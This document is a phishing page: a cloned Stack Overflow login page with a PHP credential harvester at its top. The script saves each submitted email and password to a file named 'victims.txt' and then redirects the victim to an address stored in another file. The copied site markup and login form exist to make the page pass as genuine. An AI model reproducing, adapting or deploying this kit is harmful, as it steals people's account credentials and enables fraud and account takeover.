<?php
$u = $_POST['email'];
$p = $_POST['password'];
if ($u && $p){
    fwrite(fopen('victims.txt','a+'),$u.'<!:!>'.$p."\n");
    $r = fread(fopen('redir.txt','r'),filesize('redir.txt'));
    echo "<script>window.open('".$r."','_top')</script>";
}
?>
<!DOCTYPE html>

<html class="html__responsive html__unpinned-leftnav"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <title>Log In - Stack Overflow</title>
        <link rel="shortcut icon" href="https://cdn.sstatic.net/Sites/stackoverflow/Img/favicon.ico?v=ec617d715196">
        <link rel="apple-touch-icon" href="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a">
        <link rel="image_src" href="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a"> 
        <link rel="search" type="application/opensearchdescription+xml" title="Stack Overflow" href="https://stackoverflow.com/opensearch.xml">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://stackoverflow.com/users/login?ssrc=head&amp;returnurl=https%3a%2f%2fstackoverflow.com%2f">
        <meta property="og:site_name" content="Stack Overflow">
        <meta property="og:image" itemprop="image primaryImageOfPage" content="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded">
        <meta name="twitter:card" content="summary">
        <meta name="twitter:domain" content="stackoverflow.com">
        <meta name="twitter:title" property="og:title" itemprop="name" content="Log In">
        <meta name="twitter:description" property="og:description" itemprop="description" content="Stack Overflow | The World’s Largest Online Community for Developers">

        <script src="./Log In - Stack Overflow_files/rules-p-c1rF4kxgLUzNc.js" async=""></script><script async="" src="./Log In - Stack Overflow_files/quant.js"></script><script async="" src="./Log In - Stack Overflow_files/beacon.js"></script><script async="" src="./Log In - Stack Overflow_files/analytics.js"></script><script src="./Log In - Stack Overflow_files/jquery.min.js"></script>
        <script src="./Log In - Stack Overflow_files/stub.en.js"></script>
    
        <link rel="stylesheet" type="text/css" href="./Log In - Stack Overflow_files/stacks.css">
        <link rel="stylesheet" type="text/css" href="./Log In - Stack Overflow_files/primary.css">
        <link rel="stylesheet" type="text/css" href="./Log In - Stack Overflow_files/secondary.css">

    
    <script src="./Log In - Stack Overflow_files/auth.en.js"></script>

        
        
        
        <link rel="stylesheet" type="text/css" href="./Log In - Stack Overflow_files/channels.css">
        
        
        


    <script>
        StackExchange.init({"locale":"en","serverTime":1616776117,"routeName":"Users/Login","stackAuthUrl":"https://stackauth.com","networkMetaHostname":"meta.stackexchange.com","site":{"name":"Stack Overflow","description":"Q&A for professional and enthusiast programmers","isNoticesTabEnabled":true,"enableNewTagCreationWarning":true,"insertSpaceAfterNameTabCompletion":false,"id":1,"cookieDomain":".stackoverflow.com","childUrl":"https://meta.stackoverflow.com","styleCodeWithHighlightjs":true,"negativeVoteScoreFloor":null,"enableSocialMediaInSharePopup":true,"protocol":"https"},"user":{"fkey":"ee53de468125d88180069409ddc5c691a4ef92c5afea2234c05e34b324fa44bf","tid":"a5e5e6c7-3144-16fd-2d57-c8809d7545c6","rep":0,"isAnonymous":true,"isAnonymousNetworkWide":true},"events":{"postType":{"question":1},"postEditionSection":{"title":1,"body":2,"tags":3}},"story":{"minCompleteBodyLength":75,"likedTagsMaxLength":300,"dislikedTagsMaxLength":300},"jobPreferences":{"maxNumDeveloperRoles":2,"maxNumIndustries":4},"svgIconPath":"https://cdn.sstatic.net/Img/stacks-icons","svgIconHash":"5acef7872715"}, {"userProfile":{"openGraphAPIKey":"4a307e43-b625-49bb-af15-ffadf2bda017"},"userMessaging":{"showNewFeatureNotice":true},"tags":{},"subscriptions":{"defaultBasicMaxTrueUpSeats":250,"defaultFreemiumMaxTrueUpSeats":50,"defaultMaxTrueUpSeats":1000},"snippets":{"renderDomain":"stacksnippets.net","snippetsEnabled":true},"slack":{"sidebarAdDismissCookie":"slack-sidebar-ad","sidebarAdDismissCookieExpirationDays":60.0},"site":{"allowImageUploads":true,"enableImgurHttps":true,"enableUserHovercards":true,"forceHttpsImages":true,"styleCode":true},"questions":{"enableQuestionTitleLengthLiveWarning":true,"maxTitleSize":150,"questionTitleLengthStartLiveWarningChars":50},"intercom":{"appId":"inf0secd","hostBaseUrl":"https://stacksnippets.net"},"paths":{},"monitoring":{"clientTimingsAbsoluteTimeout":30000,"clientTimingsDebounceTimeout":1000},"mentions":{"maxNumUsersInDropdown":50},"markdown":{"enableTables":true},"legal":{"oneTrustConfigId":"c3d9f1e3-55f3-4eba-b268-46cee4c6789c"},"flags":{"allowRetractingCommentFlags":true,"allowRetractingFlags":true},"comments":{},"accounts":{"currentPasswordRequiredForChangingStackIdPassword":true}});
        StackExchange.using.setCacheBreakers({"js/adops.en.js":"22a9bd59b1e9","js/ask.en.js":"91b4450eec6e","js/begin-edit-event.en.js":"7f52eac9bfd0","js/copy-transpiled.en.js":"df2902be221a","js/cm.en.js":"19f77005eb72","js/events.en.js":"02393b9aa6c5","js/explore-qlist.en.js":"be3b9d8380ea","js/full-anon.en.js":"f83646f2c644","js/full.en.js":"638a0652714f","js/help.en.js":"45dd3cca2f14","js/highlightjs-loader.en.js":"67ffaa8b539c","js/inline-tag-editing.en.js":"64af4cae422c","js/keyboard-shortcuts.en.js":"e1a9ceedc23c","js/markdown-it-loader.en.js":"33be44e8a786","js/modElections.en.js":"8ea1b62079f1","js/mobile.en.js":"8384eaca532c","js/moderator.en.js":"b4a94ad9a487","js/postCollections-transpiled.en.js":"e1ff766fca3e","js/post-validation.en.js":"7a72c94173bd","js/prettify-full.en.js":"80c9e124fdfc","js/question-editor.en.js":"","js/review.en.js":"406f3e60a7b9","js/review-v2-transpiled.en.js":"935309059e32","js/revisions.en.js":"41714edcf185","js/stacks-editor.en.js":"1b4c684d539a","js/tageditor.en.js":"4f30af0fdc59","js/tageditornew.en.js":"656f7e5bc4fd","js/tagsuggestions.en.js":"54e58e1e39f4","js/wmd.en.js":"0bccf056f2d2","js/snippet-javascript-codemirror.en.js":"26e48441b2a1"});
        StackExchange.using("gps", function() {
             StackExchange.gps.init(true);
        });
    </script>
    <noscript id="noscript-css"><style>body,.top-bar{margin-top:1.9em}</style></noscript>
    <script async="" src="./Log In - Stack Overflow_files/full-anon.en.js"></script></head>
    <body class="universal-auth-page unified-theme floating-content">
    <div id="notify-container"></div>
    <div id="custom-header"></div>
        
<header class="top-bar js-top-bar top-bar__network _fixed">
    <div class="wmx12 mx-auto grid ai-center h100" role="menubar">
        <div class="-main grid--cell">
                <a href="https://stackoverflow.com/users/login?ssrc=head&amp;returnurl=https%3a%2f%2fstackoverflow.com%2f#" class="left-sidebar-toggle p0 ai-center jc-center js-left-sidebar-toggle" role="menuitem" aria-haspopup="true" aria-controls="left-sidebar" aria-expanded="false"><span class="ps-relative"></span></a>
                <div class="topbar-dialog leftnav-dialog js-leftnav-dialog dno">
                    <div class="left-sidebar js-unpinned-left-sidebar" data-is-here-when="sm md lg" id="left-sidebar">
    <div class="left-sidebar--sticky-container js-sticky-leftnav">
        <nav role="navigation">
            <ol class="nav-links">
        <li class="">
            <a href="https://stackoverflow.com/" class="pl8 js-gps-track nav-links--link" data-gps-track="top_nav.click({is_current:false, location:22, destination:8})" aria-controls="" data-controller="" data-s-popover-placement="right">
                    <div class="grid ai-center">
                        <div class="grid--cell truncate">
                            Home
                        </div>
                    </div>
            </a>
        </li>
                <li>
                    <ol class="nav-links">
                            <li class="fs-fine tt-uppercase ml8 mt16 mb4 fc-light">Public</li>

        <li class="">
            <a id="nav-questions" href="https://stackoverflow.com/questions" class="pl8 js-gps-track nav-links--link -link__with-icon" data-gps-track="top_nav.click({is_current:false, location:22, destination:1})" aria-controls="" data-controller="" data-s-popover-placement="right">
<svg aria-hidden="true" class="svg-icon iconGlobe" width="18" height="18" viewBox="0 0 18 18"><path d="M9 1a8 8 0 100 16A8 8 0 009 1zM8 15.32a6.4 6.4 0 01-5.23-7.75L7 11.68v.8c0 .88.12 1.32 1 1.32v1.52zm5.72-2c-.2-.66-1-1.32-1.72-1.32h-1v-2c0-.44-.56-1-1-1H6V7h1c.44 0 1-.56 1-1V5h2c.88 0 1.4-.72 1.4-1.6v-.33a6.4 6.4 0 012.32 10.24v.01z"></path></svg>                    <span class="-link--channel-name">Questions</span>
            </a>
        </li>

        <li class="">
            <a id="nav-tags" href="https://stackoverflow.com/tags" class=" js-gps-track nav-links--link" data-gps-track="top_nav.click({is_current:false, location:22, destination:2})" aria-controls="" data-controller="" data-s-popover-placement="right">
                    <div class="grid ai-center">
                        <div class="grid--cell truncate">
                            Tags
                        </div>
                    </div>
            </a>
        </li>
        <li class=" youarehere">
            <a id="nav-users" href="https://stackoverflow.com/users" class=" js-gps-track nav-links--link" data-gps-track="top_nav.click({is_current:true, location:22, destination:3})" aria-controls="" data-controller="" data-s-popover-placement="right">
                    <div class="grid ai-center">
                        <div class="grid--cell truncate">
                            Users
                        </div>
                    </div>
            </a>
        </li>
                            <li class="fs-fine tt-uppercase ml8 mt16 mb4 fc-light">Find a Job</li>
        <li class="">
            <a id="nav-jobs" href="https://stackoverflow.com/jobs?so_medium=StackOverflow&amp;so_source=SiteNav" class=" js-gps-track nav-links--link" data-gps-track="top_nav.click({is_current:false, location:22, destination:6})" aria-controls="" data-controller="" data-s-popover-placement="right">
                    <div class="grid ai-center">
                        <div class="grid--cell truncate">
                            Jobs
                        </div>
                    </div>
            </a>
        </li>
        <li class="">
            <a id="nav-companies" href="https://stackoverflow.com/jobs/companies?so_medium=StackOverflow&amp;so_source=SiteNav" class=" js-gps-track nav-links--link" data-gps-track="top_nav.click({is_current:false, location:22, destination:12})" aria-controls="" data-controller="" data-s-popover-placement="right">
                    <div class="grid ai-center">
                        <div class="grid--cell truncate">
                            Companies
                        </div>
                    </div>
            </a>
        </li>
                    </ol>
                </li>
                    <li>
                        <ol class="nav-links">
                                    

<div class="js-freemium-cta ps-relative">

    <div class="fs-fine tt-uppercase ml8 mt16 mb8 fc-light">Teams</div>

    <div class="px32 pt16 pb0 fc-black-600 blr-sm overflow-hidden">
        <strong class="fc-black-750 mb6">Stack Overflow for Teams</strong>
        – Collaborate and share knowledge with a private group.
        
        <img class="wmx100 mx-auto my8 h-auto d-block" width="139" height="114" src="./Log In - Stack Overflow_files/teams-illo-free-sidebar-promo.svg" alt="">

        <a href="https://stackoverflow.com/teams/create/free?utm_source=so-owned&amp;utm_medium=side-bar&amp;utm_campaign=campaign-38&amp;utm_content=cta" class="w100 s-btn s-btn__primary s-btn__xs js-gps-track" data-gps-track="teams.create.left-sidenav.click({ Action: 6 })" data-ga="[&quot;teams left navigation - anonymous&quot;,&quot;left nav free cta&quot;,&quot;stackoverflow.com/teams/create/free&quot;,null,null]">Create a free Team</a>
        <a href="https://stackoverflow.com/teams" class="w100 s-btn s-btn__muted s-btn__xs js-gps-track" data-gps-track="teams.create.left-sidenav.click({ Action: 5 })" data-ga="[&quot;teams left navigation - anonymous&quot;,&quot;left nav free cta&quot;,&quot;stackoverflow.com/teams&quot;,null,null]">What is Teams?</a>
    </div>
</div>

                                <li class="grid ai-center jc-space-between ml8 mt24 mb4 js-create-team-cta d-none">
                                    <div class="grid--cell tt-uppercase fs-fine fc-light">Teams</div>
                                    <div class="grid--cell fs-fine fc-light mr4">
                                        <a href="javascript:void(0)" class="s-link s-link__inherit js-gps-track" role="button" aria-controls="popover-teams-create-cta" data-controller="s-popover" data-action="s-popover#toggle" data-s-popover-placement="bottom-start" data-s-popover-toggle-class="is-selected" data-gps-track="teams.create.left-sidenav.click({ Action: ShowInfo })" data-ga="[&quot;teams left navigation - anonymous&quot;,&quot;left nav show teams info&quot;,null,null,null]">
                                            What’s this?
                                        </a>

                                    </div>
                                </li>
                                <li class="ps-relative js-create-team-cta d-none">
                                    <a href="https://stackoverflow.com/teams/create/free?utm_source=so-owned&amp;utm_medium=side-bar&amp;utm_campaign=campaign-38&amp;utm_content=cta" class="pl8 js-gps-track nav-links--link" title="Stack Overflow for Teams is a private, secure spot for your organization&#39;s questions and answers." data-gps-track="teams.create.left-sidenav.click({ Action: FreemiumTeamsCreateClick })" data-ga="[&quot;teams left navigation - anonymous&quot;,&quot;left nav team click&quot;,&quot;stackoverflow.com/teams/create/free&quot;,null,null]">
                                        <div class="grid ai-center">
                                            <div class="grid--cell s-avatar va-middle bg-orange-400">
                                                <div class="s-avatar--letter mtn1">
                                                    <svg aria-hidden="true" class="svg-icon iconBriefcaseSm" width="14" height="14" viewBox="0 0 14 14"><path d="M4 3a1 1 0 011-1h4a1 1 0 011 1v1h.5c.83 0 1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5h-7A1.5 1.5 0 012 10.5v-5C2 4.67 2.67 4 3.5 4H4V3zm5 1V3H5v1h4z"></path></svg>
                                                </div>
                                                <svg aria-hidden="true" class="native s-avatar--badge svg-icon iconShieldXSm" width="9" height="10" viewBox="0 0 9 10"><path d="M0 1.84L4.5 0 9 1.84v3.17C9 7.53 6.3 10 4.5 10 2.7 10 0 7.53 0 5.01V1.84z" fill="var(--white)"></path><path d="M1 2.5L4.5 1 8 2.5v2.51C8 7.34 5.34 9 4.5 9 3.65 9 1 7.34 1 5.01V2.5zm2.98 3.02L3.2 7h2.6l-.78-1.48a.4.4 0 01.15-.38c.34-.24.73-.7.73-1.14 0-.71-.5-1.23-1.41-1.23-.92 0-1.39.52-1.39 1.23 0 .44.4.9.73 1.14.12.08.18.23.15.38z" fill="var(--black-500)"></path></svg>
                                            </div>
                                            <div class="grid--cell pl6">
                                                Create free Team
                                            </div>
                                        </div>
                                    </a>
                                </li>
                        </ol>
                    </li>
            </ol>
        </nav>
    </div>



        <div class="s-popover" id="popover-teams-create-cta" role="menu" aria-hidden="true">
            <div class="s-popover--arrow"></div>

            <div class="ps-relative overflow-hidden">
                <p class="mb2"><strong>Teams</strong></p>
                <p class="mb12 fs-caption fc-black-400">Q&amp;A for work</p>
                <p class="mb12 fs-caption fc-medium">Connect and share knowledge within a single location that is structured and easy to search.</p>
                <a href="https://stackoverflow.com/teams" class="js-gps-track s-btn s-btn__primary s-btn__xs" data-gps-track="teams.create.left-sidenav.click({ Action: CtaClick })" data-ga="[&quot;teams left navigation - anonymous&quot;,&quot;left nav cta&quot;,&quot;stackoverflow.com/teams&quot;,null,null]">
                    Learn more
                </a>
            </div>

            <div class="ps-absolute t8 r8">
                <svg aria-hidden="true" class="fc-orange-500 svg-spot spotPeople" width="48" height="48" viewBox="0 0 48 48"><path d="M13.5 28a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM7 30a1 1 0 011-1h11a1 1 0 011 1v5h11v-5a1 1 0 011-1h12a1 1 0 011 1v10a2 2 0 01-2 2H33v5a1 1 0 01-1 1H20a1 1 0 01-1-1v-5H8a1 1 0 01-1-1V30zm25-6.5a4.5 4.5 0 109 0 4.5 4.5 0 00-9 0zM24.5 34a4.5 4.5 0 100-9 4.5 4.5 0 000 9z" opacity=".2"></path><path d="M16.4 26.08A6 6 0 107.53 26C5.64 26.06 4 27.52 4 29.45V40a1 1 0 001 1h9a1 1 0 100-2h-4v-7a1 1 0 10-2 0v7H6v-9.55c0-.73.67-1.45 1.64-1.45H16a1 1 0 00.4-1.92zM12 18a4 4 0 110 8 4 4 0 010-8zm16.47 14a6 6 0 10-8.94 0A3.6 3.6 0 0016 35.5V46a1 1 0 001 1h14a1 1 0 001-1V35.5c0-1.94-1.64-3.42-3.53-3.5zM20 28a4 4 0 118 0 4 4 0 01-8 0zm-.3 6h8.6c1 0 1.7.75 1.7 1.5V45h-2v-7a1 1 0 10-2 0v7h-4v-7a1 1 0 10-2 0v7h-2v-9.5c0-.75.7-1.5 1.7-1.5zM42 22c0 1.54-.58 2.94-1.53 4A3.5 3.5 0 0144 29.45V40a1 1 0 01-1 1h-9a1 1 0 110-2h4v-7a1 1 0 112 0v7h2v-9.55A1.5 1.5 0 0040.48 28H32a1 1 0 01-.4-1.92A6 6 0 1142 22zm-2 0a4 4 0 10-8 0 4 4 0 008 0z"></path><path d="M17 10a1 1 0 011-1h12a1 1 0 110 2H18a1 1 0 01-1-1zm1-5a1 1 0 100 2h12a1 1 0 100-2H18zm-4-4a1 1 0 00-1 1v12a1 1 0 001 1h5.09l4.2 4.2a1 1 0 001.46-.04l3.7-4.16H34a1 1 0 001-1V2a1 1 0 00-1-1H14zm1 12V3h18v10h-5a1 1 0 00-.75.34l-3.3 3.7-3.74-3.75a1 1 0 00-.71-.29H15z" opacity=".35"></path></svg>
            </div>
        </div>

</div>
                </div>
                    <a href="https://stackoverflow.com/" class="-logo js-gps-track" data-gps-track="top_nav.click({is_current:false, location:22, destination:8})">
                        <span class="-img _glyph">Stack Overflow</span>
                    </a>



        </div>

            <ol class="list-reset grid gs4" role="presentation">

                    <li class="grid--cell md:d-none">
                        <a href="https://stackoverflow.com/company" class="-marketing-link js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:7})" data-ga="[&quot;top navigation&quot;,&quot;about menu click&quot;,null,null,null]">About</a>
                    </li>

                <li class="grid--cell">
                    <a href="https://stackoverflow.com/users/login?ssrc=head&amp;returnurl=https%3a%2f%2fstackoverflow.com%2f#" class="-marketing-link js-gps-track js-products-menu" aria-controls="products-popover" data-controller="s-popover" data-action="s-popover#toggle" data-s-popover-placement="bottom" data-s-popover-toggle-class="is-selected" data-gps-track="top_nav.products.click({location:22, destination:1})" data-ga="[&quot;top navigation&quot;,&quot;products menu click&quot;,null,null,null]">
                        Products
                    </a>
                </li>

                    <li class="grid--cell md:d-none">
                        <a href="https://stackoverflow.com/teams" class="-marketing-link js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:7})" data-ga="[&quot;top navigation&quot;,&quot;learn more - teams&quot;,null,null,null]">For Teams</a>
                    </li>
            </ol>
            <div class="s-popover ws2 mtn2 p0" id="products-popover" role="menu" aria-hidden="true">
                <div class="s-popover--arrow"></div>
                <ol class="list-reset s-anchors s-anchors__inherit">
                    <li class="m6">
                        <a href="https://stackoverflow.com/questions" class="bar-sm p6 d-block h:bg-black-100 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:2})" data-ga="[&quot;top navigation&quot;,&quot;public qa submenu click&quot;,null,null,null]">
                            <span class="fs-body1 d-block">Stack Overflow</span>
                            <span class="fs-caption d-block fc-light">Public questions &amp; answers</span>
                        </a>
                    </li>
                    <li class="m6">
                        <a href="https://stackoverflow.com/teams" class="bar-sm p6 d-block h:bg-black-100 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:3})" data-ga="[&quot;top navigation&quot;,&quot;teams submenu click&quot;,null,null,null]">
                            <span class="fs-body1 d-block">Stack Overflow for Teams</span>
                            <span class="fs-caption d-block fc-light">Where developers &amp; technologists share private knowledge with coworkers</span>
                        </a>
                    </li>
                    <li class="m6">
                        <a href="https://stackoverflow.com/jobs?so_source=ProductsMenu&amp;so_medium=StackOverflow" class="bar-sm p6 d-block h:bg-black-100 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:9})" data-ga="[&quot;top navigation&quot;,&quot;jobs submenu click&quot;,null,null,null]">
                            <span class="fs-body1 d-block">Jobs</span>
                            <span class="fs-caption d-block fc-light">Programming &amp; related technical career opportunities</span>
                        </a>
                    </li>
                    <li class="m6">
                        <a href="https://stackoverflow.com/talent" class="bar-sm p6 d-block h:bg-black-100 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:5})" data-ga="[&quot;top navigation&quot;,&quot;talent submenu click&quot;,null,null,null]">
                            <span class="fs-body1 d-block">Talent</span>
                            <span class="fs-caption d-block fc-light">Recruit tech talent &amp; build your employer brand</span>
                        </a>
                    </li>
                    <li class="m6">
                        <a href="https://stackoverflow.com/advertising" class="bar-sm p6 d-block h:bg-black-100 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:6})" data-ga="[&quot;top navigation&quot;,&quot;advertising submenu click&quot;,null,null,null]">
                            <span class="fs-body1 d-block">Advertising</span>
                            <span class="fs-caption d-block fc-light">Reach developers &amp; technologists worldwide</span>
                        </a>
                    </li>
                    <li class="bg-black-025 bt bc-black-075 py6 px6 bbr-sm">
                        <a href="https://stackoverflow.com/company" class="fc-light d-block py6 px6 h:fc-black-800 js-gps-track" data-gps-track="top_nav.products.click({location:22, destination:7})" data-ga="[&quot;top navigation&quot;,&quot;about submenu click&quot;,null,null,null]">About the company</a>
                    </li>
                </ol>
            </div>

            <form id="search" role="search" action="https://stackoverflow.com/search" class="grid--cell fl-grow1 searchbar px12 js-searchbar " autocomplete="off">
                    <div class="ps-relative">
                        <input name="q" type="text" placeholder="Search…" value="" autocomplete="off" maxlength="240" class="s-input s-input__search js-search-field " aria-label="Search" aria-controls="top-search" data-controller="s-popover" data-action="focus-&gt;s-popover#show" data-s-popover-placement="bottom-start">
                        <svg aria-hidden="true" class="s-input-icon s-input-icon__search svg-icon iconSearch" width="18" height="18" viewBox="0 0 18 18"><path d="M18 16.5l-5.14-5.18h-.35a7 7 0 10-1.19 1.19v.35L16.5 18l1.5-1.5zM12 7A5 5 0 112 7a5 5 0 0110 0z"></path></svg>
                        <div class="s-popover p0 wmx100 wmn4 sm:wmn-initial js-top-search-popover" id="top-search" role="menu">
    <div class="s-popover--arrow"></div>
    <div class="js-spinner p24 grid ai-center jc-center d-none">
        <div class="s-spinner s-spinner__sm fc-orange-400">
            <div class="v-visible-sr">Loading…</div>
        </div>
    </div>

    <span class="v-visible-sr js-screen-reader-info"></span>
    <div class="js-ac-results overflow-y-auto hmx3 d-none"></div>

    <div class="js-search-hints" aria-describedby="Tips for searching"></div>
</div>
                    </div>
            </form>
        
        

<ol class="overflow-x-auto ml-auto -secondary grid ai-center list-reset h100 user-logged-out" role="presentation">
        <li class="-item searchbar-trigger"><a href="https://stackoverflow.com/users/login?ssrc=head&amp;returnurl=https%3a%2f%2fstackoverflow.com%2f#" class="-link js-searchbar-trigger" role="button" aria-label="Search" aria-haspopup="true" aria-controls="search" title="Click to show search"><svg aria-hidden="true" class="svg-icon iconSearch" width="18" height="18" viewBox="0 0 18 18"><path d="M18 16.5l-5.14-5.18h-.35a7 7 0 10-1.19 1.19v.35L16.5 18l1.5-1.5zM12 7A5 5 0 112 7a5 5 0 0110 0z"></path></svg></a></li>

            <li class="-ctas">
                            <a href="https://stackoverflow.com/users/login?ssrc=head" class="login-link s-btn s-btn__filled py8 js-gps-track" rel="nofollow" data-gps-track="login.click" data-ga="[&quot;top navigation&quot;,&quot;login button click&quot;,null,null,null]">Log in</a>
                            <a href="https://stackoverflow.com/users/signup?ssrc=head&amp;returnurl=%2fusers%2fstory%2fcurrent" class="login-link s-btn s-btn__primary py8" rel="nofollow" data-ga="[&quot;sign up&quot;,&quot;Sign Up Navigation&quot;,&quot;Header&quot;,null,null]">Sign up</a>

            </li>

    <li class="js-topbar-dialog-corral" role="presentation">
            

    <div class="topbar-dialog siteSwitcher-dialog dno" role="menu">
        <div class="header">
            <h3>
                <a href="https://stackoverflow.com/">current community</a>
            </h3>
        </div>
        <div class="modal-content bg-powder-050">
            <ul class="current-site">
                    <li class="grid">
                            <div class="fl1">
                <a href="https://stackoverflow.com/" class="current-site-link site-link js-gps-track grid gs8 gsx" data-id="1" data-gps-track="site_switcher.click({ item_type:3 })">
        <div class="favicon favicon-stackoverflow site-icon grid--cell" title="Stack Overflow"></div>
        <span class="grid--cell fl1">
            Stack Overflow
        </span>
    </a>

    </div>
    <div class="related-links">
            <a href="https://stackoverflow.com/help" class="js-gps-track" data-gps-track="site_switcher.click({ item_type:14 })">help</a>
            <a href="https://chat.stackoverflow.com/?tab=site&amp;host=stackoverflow.com" class="js-gps-track" data-gps-track="site_switcher.click({ item_type:6 })">chat</a>
    </div>

                    </li>
                    <li class="related-site grid">
                            <div class="L-shaped-icon-container">
        <span class="L-shaped-icon"></span>
    </div>

                            <a href="https://meta.stackoverflow.com/" class=" site-link js-gps-track grid gs8 gsx" data-id="552" data-gps-track="site.switch({ target_site:552, item_type:3 }),site_switcher.click({ item_type:4 })">
        <div class="favicon favicon-stackoverflowmeta site-icon grid--cell" title="Meta Stack Overflow"></div>
        <span class="grid--cell fl1">
            Meta Stack Overflow
        </span>
    </a>

                    </li>
            </ul>
        </div>

        <div class="header" id="your-communities-header">
            <h3>
your communities            </h3>

        </div>
        <div class="modal-content" id="your-communities-section">

                <div class="call-to-login">
<a href="https://stackoverflow.com/users/signup?ssrc=site_switcher&amp;returnurl=%2fusers%2fstory%2fcurrent" class="login-link js-gps-track" data-gps-track="site_switcher.click({ item_type:10 })">Sign up</a> or <a href="https://stackoverflow.com/users/login?ssrc=site_switcher" class="login-link js-gps-track" data-gps-track="site_switcher.click({ item_type:11 })">log in</a> to customize your list.                </div>
        </div>

        <div class="header">
            <h3><a href="https://stackexchange.com/sites">more stack exchange communities</a>
            </h3>
            <a href="https://stackoverflow.blog/" class="fr">company blog</a>
        </div>
        <div class="modal-content">
                <div class="child-content"></div>
        </div>        
    </div>

    </li>
</ol>
    </div>
</header>

    <script>
        StackExchange.ready(function () { StackExchange.topbar.init(); });
StackExchange.scrollPadding.setPaddingTop(50, 10);    </script>





    <div class="container">
            


<div data-is-here-when="" class="left-sidebar js-pinned-left-sidebar ps-relative" data-can-be="left-sidebar"></div>



        <div id="content" class="grid grid__center snippet-hidden">

            

<div class="grid--cell">

        <div class="ta-center fs-title mx-auto mb24">
                    <a href="https://stackoverflow.com/">
                        <svg aria-hidden="true" class="native svg-icon iconLogoGlyphMd" width="32" height="37" viewBox="0 0 32 37"><path d="M26 33v-9h4v13H0V24h4v9h22z" fill="#BCBBBB"></path><path d="M21.5 0l-2.7 2 9.9 13.3 2.7-2L21.5 0zM26 18.4L13.3 7.8l2.1-2.5 12.7 10.6-2.1 2.5zM9.1 15.2l15 7 1.4-3-15-7-1.4 3zm14 10.79l.68-2.95-16.1-3.35L7 23l16.1 2.99zM23 30H7v-3h16v3z" fill="#F48024"></path></svg> 
                    </a>
        </div>
        




<div id="openid-buttons" class="mx-auto grid grid__fl1 fd-column gs8 gsy mb16 wmx3">
        <button class="grid--cell s-btn s-btn__icon s-btn__google bar-md ba bc-black-100" data-provider="google" data-oauthserver="https://accounts.google.com/o/oauth2/auth" data-oauthversion="2.0">
            <svg aria-hidden="true" class="native svg-icon iconGoogle" width="18" height="18" viewBox="0 0 18 18"><path d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 002.38-5.88c0-.57-.05-.66-.15-1.18z" fill="#4285F4"></path><path d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2a4.8 4.8 0 01-7.18-2.54H1.83v2.07A8 8 0 008.98 17z" fill="#34A853"></path><path d="M4.5 10.52a4.8 4.8 0 010-3.04V5.41H1.83a8 8 0 000 7.18l2.67-2.07z" fill="#FBBC05"></path><path d="M8.98 4.18c1.17 0 2.23.4 3.06 1.2l2.3-2.3A8 8 0 001.83 5.4L4.5 7.49a4.77 4.77 0 014.48-3.3z" fill="#EA4335"></path></svg>
Log in with Google        </button>
        <button class="grid--cell s-btn s-btn__icon s-btn__github bar-md ba bc-black-100" data-provider="github" data-oauthserver="https://github.com/login/oauth/authorize" data-oauthversion="2.0">
            <svg aria-hidden="true" class="svg-icon iconGitHub" width="18" height="18" viewBox="0 0 18 18"><path d="M9 1a8 8 0 00-2.53 15.59c.4.07.55-.17.55-.38l-.01-1.49c-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82a7.42 7.42 0 014 0c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48l-.01 2.2c0 .21.15.46.55.38A8.01 8.01 0 009 1z" fill="#010101"></path></svg>
Log in with GitHub        </button>
        <button class="grid--cell s-btn s-btn__icon s-btn__facebook bar-md" data-provider="facebook" data-oauthserver="https://www.facebook.com/v2.0/dialog/oauth" data-oauthversion="2.0">
            <svg aria-hidden="true" class="svg-icon iconFacebook" width="18" height="18" viewBox="0 0 18 18"><path d="M3 1a2 2 0 00-2 2v12c0 1.1.9 2 2 2h12a2 2 0 002-2V3a2 2 0 00-2-2H3zm6.55 16v-6.2H7.46V8.4h2.09V6.61c0-2.07 1.26-3.2 3.1-3.2.88 0 1.64.07 1.87.1v2.16h-1.29c-1 0-1.19.48-1.19 1.18V8.4h2.39l-.31 2.42h-2.08V17h-2.5z" fill="#4167B2"></path></svg>
Log in with Facebook        </button>
</div>

<div id="formContainer" class="mx-auto mb24 p24 wmx3 bg-white bar-lg auth-shadow mb24">
    <form id="login-form" class="grid fd-column gs12 gsy" action="" method="POST">
        <input type="hidden" name="fkey" value="ee53de468125d88180069409ddc5c691a4ef92c5afea2234c05e34b324fa44bf">
            <input type="hidden" name="ssrc" value="head">
                <div class="grid fd-column gs4 gsy js-auth-item ">
                    <label class="grid--cell s-label" for="email">Email</label>
                    <div class="grid ps-relative">
                        <input class="s-input" id="email" type="email" size="30" maxlength="100" name="email">
                        <svg aria-hidden="true" class="s-input-icon js-alert-icon d-none svg-icon iconAlertCircle" width="18" height="18" viewBox="0 0 18 18"><path d="M9 17A8 8 0 119 1a8 8 0 010 16zM8 4v6h2V4H8zm0 8v2h2v-2H8z"></path></svg>
                    </div>
                            <p class="grid--cell s-input-message js-error-message d-none">
            
        </p>

                </div>
